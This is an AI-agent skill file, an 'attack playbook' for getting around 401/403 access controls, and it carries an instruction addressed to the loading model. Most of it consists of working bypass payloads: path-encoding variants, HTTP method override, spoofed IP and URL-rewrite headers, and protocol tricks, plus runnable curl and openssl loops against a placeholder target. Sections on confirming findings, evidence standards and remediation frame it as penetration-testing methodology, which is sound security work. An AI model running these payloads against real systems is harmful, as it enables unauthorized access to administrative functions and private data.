---
name: 401-403-bypass-techniques
description: >-
  401/403 bypass playbook. Use when encountering access-denied responses on admin panels, API endpoints, or restricted paths. Covers path manipulation, HTTP method tampering, header injection, protocol downgrade, and automated bypass tools.
---

# SKILL: 401/403 Bypass Techniques — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Comprehensive 401/403 forbidden bypass techniques. Covers path normalization tricks, HTTP method override, header-based bypasses (X-Original-URL, X-Forwarded-For), protocol version tricks, and combination attacks. Base models typically know 2-3 header bypasses but miss the full matrix of path manipulation variants and verb+path combos.

## 0. RELATED ROUTING

- [authbypass-authentication-flaws](../authbypass-authentication-flaws/SKILL.md) — broader auth bypass (login flaws, session handling)
- [waf-bypass-techniques](../waf-bypass-techniques/SKILL.md) — when bypass is WAF-specific rather than access control
- [http-host-header-attacks](../http-host-header-attacks/SKILL.md) — Host header manipulation for routing bypass
- [request-smuggling](../request-smuggling/SKILL.md) — smuggle past access controls entirely
- [http2-specific-attacks](../http2-specific-attacks/SKILL.md) — h2c smuggling to bypass proxy ACLs

---

## 1. PATH MANIPULATION BYPASSES

The core idea: the reverse proxy/WAF checks one path format, but the backend normalizes differently.

### 1.1 Trailing Slash / Missing Slash

```
/admin      → 403
/admin/     → 200  ✓ (trailing slash)
/admin/.    → 200  ✓ (trailing dot)
```

### 1.2 Case Sensitivity

```
/admin      → 403
/Admin      → 200  ✓
/ADMIN      → 200  ✓
/aDmIn      → 200  ✓
```

Works when: proxy rule is case-sensitive but backend is case-insensitive (common on Windows/IIS).

### 1.3 URL Encoding

```
/admin          → 403
/%61dmin        → 200  ✓ (encode 'a')
/admi%6e        → 200  ✓ (encode 'n')
/%61%64%6d%69%6e → 200  ✓ (full encode)
```

### 1.4 Double URL Encoding

```
/admin              → 403
/%2561dmin          → 200  ✓ (%25 = %, decoded twice: %61 → a)
/admin%252f         → 200  ✓
/admin..%252f       → 200  ✓
```

### 1.5 Unicode / UTF-8 Encoding

```
/admin          → 403
/admi%C0%AE     → 200  ✓ (overlong UTF-8 for '.')
/admi%C0%6E     → 200  ✓ (overlong encoding)
/%C0%AFadmin    → 200  ✓ (overlong '/')
```

### 1.6 Dot-Segment / Path Traversal

```
/admin          → 403
/./admin        → 200  ✓
//admin         → 200  ✓
/admin/./       → 200  ✓
/.//admin       → 200  ✓
/admin..;/      → 200  ✓ (Tomcat path parameter)
```

### 1.7 Null Byte

```
/admin          → 403
/admin%00       → 200  ✓
/admin%00.json  → 200  ✓
/%00/admin      → 200  ✓
```

### 1.8 Path Parameter Injection

```
/admin          → 403
/admin;foo=bar  → 200  ✓ (Tomcat/Java treats ; as path param)
/admin;         → 200  ✓
/admin;x        → 200  ✓
```

### 1.9 Trailing Special Characters

```
/admin%20 (space)  /admin%09 (tab)   /admin? (empty query)
/admin.json        /admin.html       /admin/~
```

### 1.10 Backslash (Windows/IIS)

```
/admin\    /admin\..\/    \..\admin
```

### 1.11 Combined Path Tricks

```
///admin///    /./admin/./    /admin/..;/admin (Tomcat)    /%2e/admin
```

---

## 2. HTTP METHOD BYPASS

### 2.1 Direct Method Change

```
GET  /admin → 403
POST /admin → 200  ✓
PUT  /admin → 200  ✓
PATCH /admin → 200  ✓
DELETE /admin → 200  ✓
OPTIONS /admin → 200  ✓ (may leak allowed methods)
TRACE /admin → 200  ✓ (may reflect headers — XST)
HEAD /admin → 200  ✓ (same as GET but no body — confirms access)
```

### 2.2 Method Override Headers

When the proxy blocks by method, but the backend reads override headers:

```http
GET /admin HTTP/1.1
X-HTTP-Method-Override: PUT

GET /admin HTTP/1.1
X-Method-Override: POST

GET /admin HTTP/1.1
X-HTTP-Method: DELETE

POST /admin HTTP/1.1
X-HTTP-Method-Override: PATCH
_method=PUT  (in POST body — Rails, Laravel)
```

### 2.3 Custom / Invalid Methods

```
FOOBAR /admin HTTP/1.1     → some ACLs only check GET/POST
GETS /admin HTTP/1.1       → typo-like methods may bypass
CONNECT /admin HTTP/1.1    → proxy may tunnel
PROPFIND /admin HTTP/1.1   → WebDAV method
MOVE /admin HTTP/1.1       → WebDAV method
```

---

## 3. HEADER-BASED BYPASS

### 3.1 URL Rewrite Headers (Nginx/IIS)

These headers tell the backend the "real" URL, bypassing proxy-level path checks:

```http
GET / HTTP/1.1
X-Original-URL: /admin

GET / HTTP/1.1
X-Rewrite-URL: /admin
```

The proxy sees `GET /` (allowed), but the backend routes to `/admin`.

### 3.2 IP Spoofing Headers (Whitelist Bypass)

Headers to try (each with values `127.0.0.1`, `10.0.0.1`, `0.0.0.0`, `::1`):

```http
X-Forwarded-For | X-Real-IP | X-Originating-IP | X-Remote-IP
X-Remote-Addr | X-Client-IP | True-Client-IP | Cluster-Client-IP
X-ProxyUser-IP | X-Custom-IP-Authorization | Forwarded: for=127.0.0.1
```

IP encoding variants: `0177.0.0.1` (octal), `2130706433` (decimal), `0x7f000001` (hex), `localhost`

### 3.3 Other Header Tricks

```http
Referer: https://target.com/admin     # Referrer check bypass
Origin: https://target.com             # Origin check bypass
Host: localhost                         # Host header manipulation
X-Forwarded-Host: localhost            # Forwarded host
Content-Type: application/json         # Content-type switch
X-Requested-With: XMLHttpRequest       # AJAX flag
```

---

## 4. PROTOCOL VERSION BYPASS

```http
# HTTP/1.0 (some ACLs only apply to HTTP/1.1)
GET /admin HTTP/1.0

# HTTP/0.9 (extremely legacy — no headers)
GET /admin

# HTTP/2 pseudo-header tricks
:method: GET
:path: /admin
:authority: target.com
# See ../http2-specific-attacks/SKILL.md for H2-specific bypasses
```

---

## 5. VERB TAMPERING + PATH COMBINATION

Combine multiple techniques for higher success rate:

```http
POST / HTTP/1.1                          # method override + URL rewrite
X-Original-URL: /admin
X-HTTP-Method-Override: GET

GET /%61dmin HTTP/1.1                    # IP spoof + path encoding
X-Forwarded-For: 127.0.0.1

GET /Admin HTTP/1.0                      # protocol + case + IP spoof
X-Forwarded-For: 127.0.0.1
```

---

## 6. TECHNOLOGY-SPECIFIC BYPASSES

| Server | Key Tricks |
|---|---|
| **Apache** | `/admin/` (trailing slash), `/.admin` (dot prefix), `/admin%0d` (CR) |
| **Nginx** | `/Admin` (case), `/admin../` (normalization), `X-Original-URL: /admin` |
| **IIS/ASP.NET** | `/admin;.css` (path param+ext), `/admin\` (backslash), `/admin::$DATA` (ADS), `/admin%20` |
| **Tomcat/Java** | `/admin;foo` (path param), `/admin..;/` (traversal), `/;/admin` (empty param) |
| **Spring** | `/admin.anything` (suffix matching, older), `/admin/` (trailing slash) |

---

## 7. AUTOMATED TOOLS

| Tool | Purpose | URL |
|---|---|---|
| **byp4xx** | Comprehensive 403 bypass scanner | github.com/lobuhi/byp4xx |
| **403bypasser** | Automated header/path/method bypass | github.com/sting8k/403bypasser |
| **dirsearch** | Directory brute-force with encoding variants | github.com/maurosoria/dirsearch |
| **feroxbuster** | Recursive content discovery | github.com/epi052/feroxbuster |
| **Burp Intruder** | Custom payload lists for manual testing | portswigger.net |

### byp4xx usage

```bash
# Basic usage
./byp4xx.sh https://target.com/admin

# Output shows all attempted bypasses and their response codes
# 200/301/302 responses = potential bypass found
```

---

## 8. DECISION TREE

```
Got 401 or 403 on a path?
│
├── Try PATH MANIPULATION first (highest success rate)
│   ├── /path/      (trailing slash)
│   ├── /PATH       (case change)
│   ├── /path%20    (trailing space)
│   ├── /./path     (dot segment)
│   ├── //path      (double slash)
│   ├── /path;x     (path parameter — Java/Tomcat)
│   ├── /path..;/   (Tomcat specific)
│   ├── /%2e/path   (encoded dot)
│   ├── /path%00    (null byte)
│   ├── /path%23    (encoded hash)
│   └── Result? → 200 = bypass found
│
├── Path tricks failed → Try METHOD BYPASS
│   ├── POST/PUT/PATCH/DELETE/OPTIONS
│   ├── HEAD (same as GET without body)
│   ├── X-HTTP-Method-Override: PUT
│   └── TRACE (may reflect auth headers — XST)
│
├── Method tricks failed → Try HEADER BYPASS
│   ├── X-Original-URL: /path      (Nginx/IIS rewrite)
│   ├── X-Rewrite-URL: /path       (same concept)
│   ├── X-Forwarded-For: 127.0.0.1 (IP whitelist)
│   ├── X-Real-IP: 127.0.0.1
│   ├── True-Client-IP: 127.0.0.1
│   └── Referer: https://target.com/path
│
├── Header tricks failed → Try PROTOCOL BYPASS
│   ├── HTTP/1.0 instead of 1.1
│   ├── HTTP/2 h2c smuggling (../http2-specific-attacks/)
│   └── WebSocket upgrade
│
├── Single techniques failed → Try COMBINATIONS
│   ├── Method + Path: POST /PATH/
│   ├── Header + Path: X-Forwarded-For + /path%20
│   ├── All three: POST + X-Original-URL + IP headers
│   └── Protocol + Path: HTTP/1.0 + encoded path
│
├── All bypasses failed → Consider ALTERNATIVE APPROACHES
│   ├── Request smuggling (../request-smuggling/) → smuggle past ACL
│   ├── SSRF (../ssrf-server-side-request-forgery/) → access from server
│   ├── IDOR (../idor-broken-object-authorization/) → access data directly
│   └── Auth flaws (../authbypass-authentication-flaws/) → login bypass
│
└── Automated scan with byp4xx / 403bypasser for completeness
```

---

## 9. QUICK REFERENCE — KEY PAYLOADS

```http
# Top 10 quick-wins (try these first)
GET /admin/     HTTP/1.1        # trailing slash
GET /Admin      HTTP/1.1        # case change
GET /admin%20   HTTP/1.1        # trailing space
GET /./admin    HTTP/1.1        # dot segment
GET //admin     HTTP/1.1        # double slash
POST /admin     HTTP/1.1        # method change
GET / HTTP/1.1                  # X-Original-URL bypass
X-Original-URL: /admin
GET /admin HTTP/1.1             # IP whitelist bypass
X-Forwarded-For: 127.0.0.1
GET /admin;.css HTTP/1.1        # IIS path param
GET /admin..;/ HTTP/1.1         # Tomcat bypass
```

---

## 10. EXECUTION PRIMITIVES

A 401/403 bypass is proven by **the same protected resource returning `200` with its content** when a
transformed request is sent. Every test requires the blocked control first.

### 10.1 Capture the blocked control, per endpoint per role

```bash
T="https://target.tld"
for R in "" "-H 'Cookie: session=USERTOK'" "-H 'Cookie: session=ADMINTOK'"; do
  echo "=== role: ${R:-anonymous}"
  # shellcheck disable=SC2086
  curl -sS -o /tmp/c -w '  baseline %{http_code} %{size_download}\n' "$T/admin" -b "session=$TOK"
  curl -sS -o /tmp/ca -D /tmp/cd -w '  api      %{http_code} %{size_download}\n' "$T/api/admin/users" -b "session=$TOK"
  grep -icE 'forbidden|unauthorized|denied|login' /tmp/c
done
```

**Record the status, the size, and the body fingerprint for each role.** Every bypass claim is a
comparison against these numbers; a `200` that returns a login page is not a bypass.

### 10.2 Path manipulation matrix

```bash
B="/admin"
for P in "$B/" "$B//" "$B/." "$B/./" "$B/.." "$B/../admin" "/./$B" "/$B/" \
         "$B%20" "$B%09" "$B%00" "$B..;/" "$B;" "$B/;" "$B%2f" "$B%2e" \
         "//$B" "///$B" "/$B/..;/admin" "/admin/..;/public" "/$B?" "/$B#" \
         "/admin/.json" "/admin.json" "/admin/..%2fadmin" "%2fadmin" "/ADMIN" ; do
  R=$(curl -sS -o /tmp/p -w '%{http_code}:%{size_download}' "$T$P" -b "session=$TOK")
  printf '%-28s %s  %s\n' "$P" "$R" "$(grep -oiE 'forbidden|unauthorized|not found|sign in' /tmp/p | head -1)"
done
```

Compare each result against the baseline **size**, not just the status - a `200` that is the same size
as the `403` page is not a bypass. Semicolon and encoded-separator forms exploit the difference between
the proxy's path parser and the framework's.

### 10.3 HTTP method and override matrix

```bash
for M in GET POST PUT PATCH DELETE HEAD OPTIONS TRACE CONNECT PROPFIND; do
  R=$(curl -sS -o /tmp/m -w '%{http_code}:%{size_download}' -X "$M" "$T/admin" -b "session=$TOK")
  printf '%-10s %s\n' "$M" "$R"
done
# method override headers and parameters, which frameworks honour
for OH in "X-HTTP-Method-Override: GET" "X-Method-Override: GET" "X-HTTP-Method: GET" \
          "X-Original-Method: GET"; do
  R=$(curl -sS -o /tmp/mo -w '%{http_code}:%{size_download}' -X POST "$T/admin" -H "$OH" -b "session=$TOK")
  printf '%-34s %s\n' "$OH" "$R"
done
curl -sS -o /tmp/mp -w 'param-override %{http_code}:%{size_download}\n' -X POST "$T/admin?_method=GET" -b "session=$TOK"
```

A missing rule for a method the framework still routes is the recurring bug. **Run the control for each
method** - a `200` on `OPTIONS` that has always been allowed is not a bypass.

### 10.4 Header-based bypass matrix

```bash
for H in \
  'X-Forwarded-For: 127.0.0.1' 'X-Forwarded-For: 10.0.0.1' \
  'X-Forwarded-Host: localhost' 'X-Forwarded-Host: 127.0.0.1' \
  'X-Forwarded-URL: /public' 'X-Original-URL: /public' 'X-Rewrite-URL: /public' \
  'X-Custom-IP-Authorization: 127.0.0.1' 'X-Originating-IP: 127.0.0.1' \
  'Client-IP: 127.0.0.1' 'X-Real-IP: 127.0.0.1' 'True-Client-IP: 127.0.0.1' \
  'X-Forwarded-Prefix: /public' 'X-Original-Path: /public' \
  'Referer: https://target.tld/admin' 'X-Requested-With: XMLHttpRequest' ; do
  R=$(curl -sS -o /tmp/h -w '%{http_code}:%{size_download}' "$T/admin" -H "$H" -b "session=$TOK")
  printf '%-42s %s\n' "$H" "$R"
done
```

`X-Original-URL` and `X-Rewrite-URL` are the classic pair: a proxy that routes on them while the
framework authorizes on the visible path produces exactly this bypass. **The proof is the protected
content arriving**, not the status code alone.

### 10.5 Protocol and version tricks

```bash
# HTTP/1.0 and 0.9 style requests can bypass rules written for 1.1
curl -sS -o /tmp/v1 -w 'http1.0 %{http_code}:%{size_download}\n' --http1.0 "$T/admin" -b "session=$TOK"
curl -sS -o /tmp/v2 -w 'http1.1 %{http_code}:%{size_download}\n' --http1.1 "$T/admin" -b "session=$TOK"
curl -sS -o /tmp/v3 -w 'no-body %{http_code}:%{size_download}\n' --http1.1 "$T/admin" -b "session=$TOK" -H 'Content-Length: 0'
# a bare LF as the line terminator, which some parsers accept and some rules miss
printf 'GET /admin HTTP/1.1\nHost: target.tld\nAuthorization: Bearer %s\n\n' "$TOK" | \
  openssl s_client -quiet -connect target.tld:443 -servername target.tld 2>/dev/null | head -15
```

Bare-LF line endings and unusual versions exercise parser differences between the rule engine and the
application. **Only report it when the protected content is returned.**

### 10.6 Trailing-dot, case, and encoding on Windows/IIS targets

```bash
# on Windows filesystems /admin and /admin. and /admin::$DATA can be the same resource
for P in "/admin." "/admin%2e" "/admin::$DATA" "/admin%20." "/admin.asp/." \
         "/admin.asp%00.jpg" "/admin.asp;.jpg" "/admin.asp/.." ; do
  R=$(curl -sS -o /tmp/w -w '%{http_code}:%{size_download}' "$T$P" -b "session=$TOK")
  printf '%-26s %s\n' "$P" "$R"
done
# and the IIS short-name form for a resource you cannot list
curl -sS -o /tmp/i -w 'shortname %{http_code}\n' "$T/admin~1" -b "session=$TOK"
```

Windows path normalisation is a distinct bypass family. **Identify the server first** (`Server:`
header) - these forms are inert on Linux and reporting them there is a false positive.

### 10.7 Authorization logic, not path parsing

```bash
# the resource guard may be on the collection while the item endpoint is unguarded
curl -sS -o /tmp/g1 -w 'collection %{http_code}:%{size_download}\n' "$T/api/admin/users" -b "session=$TOK"
curl -sS -o /tmp/g2 -w 'item       %{http_code}:%{size_download}\n' "$T/api/admin/users/1" -b "session=$TOK"
# and the alternate representations of the same resource
for P in "/api/admin/users" "/api/v1/admin/users" "/api/admin/users.json" \
         "/api/admin/users?format=json" "/api/admin/users/" "/api/internal/users" \
         "/api/admin/users/1/../1" ; do
  R=$(curl -sS -o /tmp/a -w '%{http_code}:%{size_download}' "$T$P" -b "session=$TOK")
  printf '%-36s %s\n' "$P" "$R"
done
```

This is where most real findings live: **the guard exists on one route and not its neighbour**. Compare
the item endpoint's result against the collection's, with your own low-privilege token.

### 10.8 Prove it with the content, not the code

```bash
# a bypass claim must show the protected bytes
curl -sS -o /tmp/ok -w 'bypassed %{http_code} %{size_download}\n' "$T/admin?%00" -b "session=$TOK"
head -c 300 /tmp/ok; echo "---"
# and the fingerprint comparison against the blocked control
md5sum /tmp/c /tmp/ok
grep -c 'forbidden' /tmp/ok
echo "expected: the bypass body contains administrative content and has no block page"
```

Always fingerprint the blocked control. **A bypass whose body equals the `403` body is a status-code
artefact**, and these are the single most common false positive in 401/403 testing.

---

## 11. CONFIRMING THE FINDING

| Step | Question | What it proves |
|---|---|---|
| 1 | What is the **blocked control** for this exact endpoint and role (status, size, fingerprint)? | the thing you are bypassing |
| 2 | Does the transformed request return **`200` with different, protected content**? | the bypass |
| 3 | Is the content **actually privileged** - does it contain data the role should not see? | impact, not a status-code artefact |
| 4 | Which **transformation** caused it (path, method, header, encoding)? | the fix target |
| 5 | Is it reproducible **with a fresh session**? | rules out a stale cache or a session quirk |
| 6 | Is the endpoint reachable by the **same low-privilege role** you hold? | severity |
| 7 | Does the bypass work on the **resource you actually want** (the API, not just the HTML page)? | the data-bearing endpoint |

**Content is the bar.** A `200` that returns the login page, the block page, or an empty body is not a
bypass. Compare sizes and fingerprints against the control every time.

---

## 12. EVIDENCE STANDARD

| Item | Why |
|---|---|
| The **blocked control** - the same request with the normal path, method, and headers | without it there is nothing to compare |
| The **transformation** - the exact path, method, or header that changed the result | the fix location |
| The **protected response body**, showing content the role should not have | the impact |
| **Status, size, and a body fingerprint** for both the control and the bypass | distinguishes a bypass from a status artefact |
| The **role/token used**, with its legitimate permissions documented | proves the content was privileged |
| The **endpoint inventory** tested, so the reader knows the scope of the finding | one endpoint versus a pattern matters |
| **Negative control** - a transformation that does not bypass returns the block page | shows the bypass is specific |
| Confirmation the bypass **reproduces on a new session** | rules out caching |
| The **server and framework** identification | determines which bypass family applies |
| A statement that no **privileged action** was taken beyond reading | scope discipline |

Report the **control, the bypass, and the content**: "`GET /api/admin/users` with a standard user's
session returns `403` and a 1,240-byte block page; `GET /api/admin/users/` with the same session returns
`200` and 18,402 bytes of the administrative user list containing email addresses and role assignments;
the trailing slash bypasses the authorization rule, which matches only the exact path, while the
framework's router matches both; this reproduces with a freshly issued session and on
`/api/admin/audit` as well", never "the admin panel can be accessed by bypassing 403".

### False positives - do not report these

| Observation | Why it is not a finding |
|---|---|
| A `200` whose body is the login or block page | no protected content |
| A `200` that is the same size and fingerprint as the `403` | a status-code artefact |
| A different status with an empty body | nothing was returned |
| A `200` on a public page that has always been public | no control bypassed |
| A bypass that only works with an admin token | not a bypass |
| A caching artefact that disappears on a fresh session | not reproducible |
| A `200` returned because your session was upgraded in the meantime | session change, not a bypass |
| A Windows path form on a Linux server | not applicable |
| A method allowed by the app's own CORS or `OPTIONS` policy | by design |
| A redirect to a login page with `302` | authentication still enforced |
| Content identical to what your own role can already see elsewhere | no additional access |
| A transformation you can only send with a proxy that rewrites the request invalidly | not deliverable |

**Fingerprint everything.** The status code alone is the source of nearly every false positive here.

---

## 13. REMEDIATION REFERENCE

1. **Enforce authorization centrally, in one middleware, on the canonical route** - per-route guards produce the neighbour-route gap that most real bypasses exploit, so a single chokepoint removes the class.
2. **Normalise the path before authorization, and reject non-canonical forms** - `%2f`, `..;/`, duplicate slashes, trailing dots, and encoded separators should be rejected or canonicalised once, at the edge, so every layer agrees.
3. **Deny by default for every method and route** - an unlisted method or route should be refused rather than falling through to a handler, which closes the method-tampering family.
4. **Do not trust `X-Original-URL`, `X-Rewrite-URL`, or any client-supplied routing header** - strip them at the edge; a proxy that routes on a header while the app authorizes on the path is the exact misconfiguration.
5. **Never treat a header as an authentication signal** - `X-Forwarded-For`, `X-Real-IP`, and similar must come only from a trusted proxy that strips inbound copies.
6. **Authorize the resource, not the URL** - check that the caller may act on the specific object, which makes path-form tricks irrelevant.
7. **Test the item endpoints, not just the collections** - the pervasive gap is a guarded list endpoint and an unguarded single-item endpoint.
8. **Reject requests with unusual line terminators and malformed versions at the edge** - a strict parser in front of the application removes the parser-difference family.
9. **Keep the server, proxy, and framework patched** - many path normalisation bugs are version-specific, and the fix is an upgrade.
10. **Log and alert on requests containing `%2f`, `..;/`, or a routing header** - these are essentially never legitimate and are a high-signal detection rule.
11. **Add an authorization regression suite that hits every route with a low-privilege token** - an automated sweep for `200`s on privileged routes detects both the original gap and any regression.

---

## 14. RELATED SIBLINGS - LOAD TOGETHER

- [authbypass-authentication-flaws](../authbypass-authentication-flaws/SKILL.md) - the authentication-side counterpart
- [idor-broken-object-authorization](../idor-broken-object-authorization/SKILL.md) - the object-level authorization gap
- [api-authorization-and-bola](../api-authorization-and-bola/SKILL.md) - the API-specific form
- [path-traversal-lfi](../path-traversal-lfi/SKILL.md) - the same path-parsing techniques for file access
- [waf-bypass-techniques](../waf-bypass-techniques/SKILL.md) - the broader normalisation-bypass family
